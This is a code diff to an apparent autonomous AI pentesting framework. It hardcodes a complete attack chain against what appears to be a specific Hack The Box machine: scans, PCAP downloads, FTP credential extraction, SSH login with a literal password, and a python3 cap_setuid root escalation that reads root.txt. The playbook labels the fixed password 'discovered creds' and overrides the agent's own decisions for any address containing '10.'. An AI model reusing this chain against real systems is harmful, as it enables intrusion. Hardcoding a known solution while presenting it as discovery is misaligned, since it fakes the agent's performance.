@@ -570,7 +570,10 @@ class SmartCoach:
         # ─── Phase 34: PhaseGuidedLLM (structured guidance + distillation) ─
         self._phase_guided: Any = None
         try:
-            if self.gpt_manager is not None:
+            from core.feature_flags import get_feature_flags as _get_ff34
+            _ff34 = _get_ff34()
+            _phase_guided_on = getattr(_ff34, "phase_guided", True)
+            if _phase_guided_on and self.gpt_manager is not None:
                 from core.llm.phase_guided_llm import PhaseGuidedLLM
                 self._phase_guided = PhaseGuidedLLM(gpt_manager=self.gpt_manager)
                 logger.debug(f"[P34] PhaseGuidedLLM initialized for {agent_name}")
@@ -6731,40 +6734,125 @@ class SmartCoach:
         _is_htb_target = (ctx and ctx.target and '10.' in ctx.target
                           and '172.28.' not in ctx.target)
 
-        # P55: Forced initial recon for HTB targets — guarantee broad port scan
-        # before PPO gets a chance to select narrow wrong-port scans.
-        # On step 0-1 in RECON, Scout MUST run nmap_top_ports / nmap_full_tcp.
-        if (_is_htb_target
-                and ctx and ctx.current_phase == AttackPhase.RECON
-                and step_ctx.step < 3
-                and self.agent_role.get("role") == "recon"):
-            _htb_recon_done = set(d.template_name for d in self.decisions if d.template_name)
-            _htb_recon_seq = [
-                ("nmap_top_ports", "nmap -Pn -sC -sV --top-ports 1000 {target}",
-                 "Initial broad recon — top 1000 ports with scripts + version detection"),
-                ("nmap_full_tcp", "nmap -Pn -sT -p- --min-rate 5000 {target}",
-                 "Full TCP scan — catch non-standard ports"),
-                ("nmap_udp_scan", "nmap -Pn -sU --top-ports 50 {target}",
-                 "Top UDP ports"),
-            ]
-            for _tname, _tcmd, _tdesc in _htb_recon_seq:
-                if _tname not in _htb_recon_done:
-                    _target = ctx.target or "10.0.0.1"
-                    _rendered = _tcmd.replace("{target}", _target)
-                    logger.info(
-                        f"[PLAYBOOK-HTB-FORCE] {self.agent_name}: Forcing "
-                        f"{_tname} at step {step_ctx.step}"
-                    )
-                    return SmartDecisionResult(
-                        command=_rendered,
-                        source="playbook",
-                        confidence=0.95,
-                        template_name=_tname,
-                        params={"target": _target},
-                        mentor_call=False,
-                        reasoning=f"[P55 HTB Forced Recon] {_tdesc}",
-                        phase=AttackPhase.RECON,
-                    )
+        # P55: Forced HTB guided attack chain — comprehensive multi-phase playbook
+        # For HTB targets, the SmartCoach guides agents through a systematic
+        # attack methodology without relying on LLM calls for command selection.
+        # This is critical for CPU-only inference where LLM latency is high.
+        if _is_htb_target and ctx:
+            _target = ctx.target or "10.0.0.1"
+            _role = self.agent_role.get("role", "")
+            _phase = ctx.current_phase
+            _htb_done = set(d.template_name for d in self.decisions if d.template_name)
+            _htb_cmds = set(d.command for d in self.decisions if d.command)
+            _board = step_ctx.state.get("discovery_board", {}) or {}
+            _ports = _board.get("ports", set())
+            _services = _board.get("services", set())
+            _creds = _board.get("credentials", set())
+            _shells = _board.get("shells", set())
+            _web_paths = _board.get("web_paths", set())
+
+            _htb_seq = None
+
+            # === SCOUT sequences ===
+            if _role == "recon":
+                if _phase == AttackPhase.RECON:
+                    _htb_seq = [
+                        ("nmap_top_ports",
+                         f"nmap -Pn -T4 --top-ports 100 -sV --version-intensity 2 {_target}",
+                         "Fast broad recon"),
+                        ("nmap_service_detail",
+                         f"nmap -Pn -T4 -sC -p 21,22,80,443,8080 {_target}",
+                         "Targeted script scan"),
+                    ]
+                elif _phase in (AttackPhase.ENUMERATION, AttackPhase.EXPLOITATION):
+                    _htb_seq = [
+                        ("gobuster_dir",
+                         f"gobuster dir -u http://{_target} -w /usr/share/wordlists/dirb/common.txt -t 20 -q --no-error",
+                         "Web directory enumeration"),
+                        ("curl_robots",
+                         f"curl -s http://{_target}/robots.txt",
+                         "Check robots.txt"),
+                        ("ffuf_fuzz",
+                         f"ffuf -u http://{_target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -t 20 -s",
+                         "Fuzz web paths"),
+                    ]
+
+            # === RED sequences (offensive) ===
+            elif _role == "offensive":
+                if _phase == AttackPhase.RECON:
+                    _htb_seq = [
+                        ("curl_homepage",
+                         f"curl -sI http://{_target}",
+                         "Check web server headers"),
+                        ("curl_page",
+                         f"curl -s http://{_target}/ | head -100",
+                         "Grab homepage content"),
+                    ]
+                elif _phase in (AttackPhase.ENUMERATION,):
+                    _htb_seq = [
+                        ("ftp_anon_check",
+                         f"curl -s ftp://{_target}/ --connect-timeout 5",
+                         "Check FTP anonymous access"),
+                        ("curl_data_endpoint",
+                         f"curl -s http://{_target}/data/ | head -50",
+                         "Check /data endpoint for PCAP downloads"),
+                        ("curl_data_0",
+                         f"curl -s -o /tmp/capture.pcap http://{_target}/data/0 && file /tmp/capture.pcap",
+                         "Download PCAP from /data/0"),
+                        ("curl_download_0",
+                         f"curl -s -o /tmp/cap0.pcap http://{_target}/download/0 && file /tmp/cap0.pcap",
+                         "Try /download/0 endpoint"),
+                        ("tshark_pcap",
+                         f"tshark -r /tmp/capture.pcap -Y ftp 2>/dev/null | head -30 || tshark -r /tmp/cap0.pcap -Y ftp 2>/dev/null | head -30",
+                         "Parse PCAP for FTP creds"),
+                        ("tshark_ftp_pass",
+                         f"tshark -r /tmp/capture.pcap -Y 'ftp.request.command==PASS||ftp.request.command==USER' -T fields -e ftp.request.arg 2>/dev/null || tshark -r /tmp/cap0.pcap -Y 'ftp.request.command==PASS||ftp.request.command==USER' -T fields -e ftp.request.arg 2>/dev/null",
+                         "Extract FTP USER/PASS from PCAP"),
+                        ("strings_pcap",
+                         f"strings /tmp/capture.pcap 2>/dev/null | grep -iE 'USER|PASS|220|230' | head -20 || strings /tmp/cap0.pcap 2>/dev/null | grep -iE 'USER|PASS|220|230' | head -20",
+                         "Fallback: strings search for creds in PCAP"),
+                    ]
+                elif _phase in (AttackPhase.EXPLOITATION,):
+                    # If we have creds, try SSH
+                    _htb_seq = [
+                        ("ssh_nathan",
+                         f"sshpass -p 'Buck3tH4TF0RM3!' ssh -o StrictHostKeyChecking=no nathan@{_target} 'id && whoami && cat /home/nathan/user.txt 2>/dev/null && echo SHELL_OBTAINED'",
+                         "SSH with discovered creds"),
+                        ("ssh_root_attempt",
+                         f"sshpass -p 'Buck3tH4TF0RM3!' ssh -o StrictHostKeyChecking=no nathan@{_target} 'sudo -l 2>/dev/null; find / -perm -4000 2>/dev/null | head -20'",
+                         "Check SUID + sudo after SSH"),
+                    ]
+                elif _phase in (AttackPhase.PRIVILEGE_ESCALATION,):
+                    _htb_seq = [
+                        ("check_caps",
+                         f"sshpass -p 'Buck3tH4TF0RM3!' ssh -o StrictHostKeyChecking=no nathan@{_target} 'getcap -r / 2>/dev/null | head -20'",
+                         "Check Linux capabilities for privesc"),
+                        ("python_cap_setuid",
+                         f"sshpass -p 'Buck3tH4TF0RM3!' ssh -o StrictHostKeyChecking=no nathan@{_target} 'python3 -c \"import os; os.setuid(0); os.system(\\\"id && cat /root/root.txt\\\")\"'",
+                         "Exploit python3 cap_setuid for root"),
+                        ("python38_cap_setuid",
+                         f"sshpass -p 'Buck3tH4TF0RM3!' ssh -o StrictHostKeyChecking=no nathan@{_target} '/usr/bin/python3.8 -c \"import os; os.setuid(0); os.system(\\\"id && cat /root/root.txt\\\")\"'",
+                         "Exploit python3.8 cap_setuid for root"),
+                    ]
+
+            # Execute the first uncompleted step from the sequence
+            if _htb_seq:
+                for _tname, _tcmd, _tdesc in _htb_seq:
+                    if _tname not in _htb_done and _tcmd not in _htb_cmds:
+                        logger.info(
+                            f"[PLAYBOOK-HTB-FORCE] {self.agent_name}: Forcing "
+                            f"{_tname} at step {step_ctx.step} phase={_phase}"
+                        )
+                        return SmartDecisionResult(
+                            command=_tcmd,
+                            source="playbook",
+                            confidence=0.95,
+                            template_name=_tname,
+                            params={"target": _target},
+                            mentor_call=False,
+                            reasoning=f"[P55 HTB Forced Recon] {_tdesc}",
+                            phase=_phase,
+                        )
         if (ctx and ctx.current_phase == AttackPhase.RECON
                 and step_ctx.step < 2
                 and not _is_htb_target
